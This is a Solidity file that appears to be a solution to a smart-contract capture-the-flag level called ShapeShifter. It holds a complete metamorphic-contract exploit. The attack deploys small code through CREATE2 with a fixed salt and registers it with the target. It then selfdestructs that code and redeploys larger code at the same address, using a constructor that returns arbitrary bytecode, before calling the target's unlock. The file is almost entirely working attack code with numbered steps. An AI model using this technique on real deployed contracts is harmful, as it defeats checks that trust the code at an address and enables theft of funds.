// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/ShapeShifter.sol';

contract SmallContract {
    function version() external returns(uint256) {
        return 1;
    }

    function destroy() external {
        selfdestruct(payable(address(0)));
    }
}
contract LargeContract is SmallContract {
    // Add random extra method to increase codesize
    function bloat() external {
        revert("Hey don't call me");
    }
}

// Contract that bypasses the normal process of returning the compiled bytecode of the contract and replaces it with code returned from teh attack contracts storage variable
contract Choice {
    constructor() {
        ShapeShifterAttack shapeShifterAttack = ShapeShifterAttack(msg.sender);
        bytes memory code = shapeShifterAttack.code();

        uint256 memOfs = dataPtr(code);
        uint256 len = code.length;

        // This is a "hack" that ensures that the constructor returns the code gotten from the shapeShifterAttack contract and not what is compiled from this solidity contract definition
        assembly {
            return(memOfs, len)
        }
    }

    // Returns a pointer to the memory address of the data in given bytes array
    function dataPtr(bytes memory bts) internal pure returns (uint addr) {
        assembly {
            // Byte arrays are stored in memory with a 32 byte header containing length etc.
            // The actual data starts after that header so we have to skip it
            addr := add(bts, /*BYTES_HEADER_SIZE*/32)
        }
    }
}


contract ShapeShifterAttack {
    ShapeShifter public target;
    address public changingContract;
    uint public password;
    uint public constant SALT = 12345;
    bytes public code;

    constructor (address payable _target) {
      target = ShapeShifter(_target);
    }
    

    // Step 1
    function deploySmallContract() external returns(address) {
      code = type(SmallContract).runtimeCode;
      changingContract = _deploy();
    }

    // Step 2
    function registerContract() external returns(address) {
        target.submitContract(changingContract);
    }

    // Step 3
    function destroyContract() external returns(address) {
        SmallContract(changingContract).destroy();
        code = type(LargeContract).runtimeCode;
    }

    // Step 4
    function deployLargeContract() external returns(address) {
      changingContract = _deploy();
    }

    // e voila
    function unlock() external returns(address) {
        target.unlock();
    }

    function _deploy() internal returns(address) {
        bytes32 salt = bytes32(SALT);
        Choice d = new Choice{salt: salt}();
        return address(d);
    }
}
